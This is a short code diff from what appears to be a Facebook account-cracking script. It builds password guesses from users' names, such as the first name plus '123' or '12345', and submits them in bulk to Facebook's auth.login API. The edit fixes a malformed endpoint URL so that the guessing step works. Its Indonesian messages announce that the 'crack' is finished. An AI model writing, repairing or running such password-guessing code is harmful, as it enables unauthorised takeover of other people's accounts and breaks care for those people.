@@ -711,7 +711,7 @@ def sandiotomatis():
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
 				else:
 					pwx = [name, nam[0]+"123", nam[0]+"12345"]
-				fall.submit(mfbasic, uid, pwx,"https://https://b-api.facebook.com/method/auth.login")
+				fall.submit(mfbasic, uid, pwx,"https://b-api.facebook.com/method/auth.login")
 		exit("\n\n \x1b[1;92m╠══[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mCrack nya sudah selesai sayang...\x1b[1;97m")
 		
 ### BAGIAN CRACK ###
